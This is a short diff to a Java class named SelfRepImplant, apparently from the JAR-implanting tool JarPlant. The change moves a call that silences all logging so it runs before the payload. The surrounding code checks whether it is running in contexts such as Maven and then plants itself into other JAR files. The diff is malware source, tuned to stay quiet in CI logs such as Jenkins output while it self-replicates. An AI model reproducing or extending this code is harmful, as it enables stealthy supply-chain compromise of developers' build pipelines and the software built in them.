@@ -125,6 +125,11 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
             return;
         }
 
+        /*
+         * Crudely prevent JarPlant (the library) from flooding the log/stdout.
+         */
+        disableAllLogging();
+
         payload();
     }
 
@@ -175,12 +180,6 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
 
     public void payload() {
         /*
-         * Crudely prevent JarPlant from flooding the log/stdout.
-         * If it's eerily quiet in the Jenkins output, try removing this line.
-         */
-        disableAllLogging();
-
-        /*
          * The idea with "execution context awareness" is that you can also do different things based on indicators
          * of in what context this implant was triggered from.
          * Want to JarPlant all the things only if we're running inside Maven?
@@ -205,12 +204,6 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
                 jarPlantAllTheThings();
             }
         }
-
-        /*
-         * Crudely prevent JarPlant from flooding the log/stdout.
-         * If it's eerily quiet in the Jenkins output, try removing this line.
-         */
-        disableAllLogging();
     }
 
     private void jarPlantAllTheThings() {
